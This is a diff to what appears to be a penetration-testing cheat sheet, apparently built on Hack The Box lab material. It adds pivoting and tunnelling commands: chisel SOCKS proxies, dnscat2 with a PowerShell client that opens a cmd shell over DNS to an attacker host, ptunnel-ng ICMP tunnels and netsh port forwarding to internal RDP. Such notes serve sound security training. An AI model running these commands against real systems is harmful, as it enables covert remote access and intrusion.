@@ -756,7 +756,7 @@ msf6 > use post/multi/manage/autoroute
 - Proxychains
 
 ```
-Edit /etc/proxychains4.conf
+Edit /etc/proxychains4.conf OR /etc/proxychains.conf
 Edit [ProxyList] e.g. socks4 127.0.0.1 9050 OR socks5 127.0.0.1 9050
 $ proxychains <command>
 # Note that the -sT option is required when using Nmap with ProxyChains - also use sudo
@@ -787,6 +787,8 @@ $ proxychains <command> -k
 https://github.com/jpillora/chisel
 $ sudo ./chisel server -p 8000 --reverse
 $ ./chisel client <IP address>:8000 R:631:127.0.0.1:631
+$ sudo ./chisel server -v -p 1234 --socks5
+$ ./chisel client -v 10.129.202.64:1234 socks
 ```
 
 - Sshuttle
@@ -810,6 +812,32 @@ $ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
 $ python client.py --server-ip <IP address> --server-port 8080 --ntlm-proxy-ip <Proxy IP address> --ntlm-proxy-port 8081 --domain <domain> --username <username> --password <password>
 ```
 
+- Dnscat2
+
+```
+https://github.com/iagox86/dnscat2
+$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+```
+
+- Dnscat2 PowerShell
+
+```
+https://github.com/lukebaggett/dnscat2-powershell
+PS C:\> Import-Module dnscat2.ps1
+PS C:\> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+dnscat2> ?
+dnscat2> window -i 1
+```
+
+- Ptunnel-ng
+
+```
+https://github.com/utoni/ptunnel-ng
+$ sudo ./autogen.sh
+$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+```
+
 - Meterpreter Portfwd
 
 ```
@@ -821,6 +849,13 @@ meterpreter > portfwd add -R -l 8081 -p 1234 -L <IP address>
 
 ```
 C:\> plink -D 9050 ubuntu@<IPaddressofTarget>
+```
+
+- Netsh
+
+```
+C:\> netsh.exe interface portproxy show v4tov4
+C:\> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
 ```
 
 - PsExec
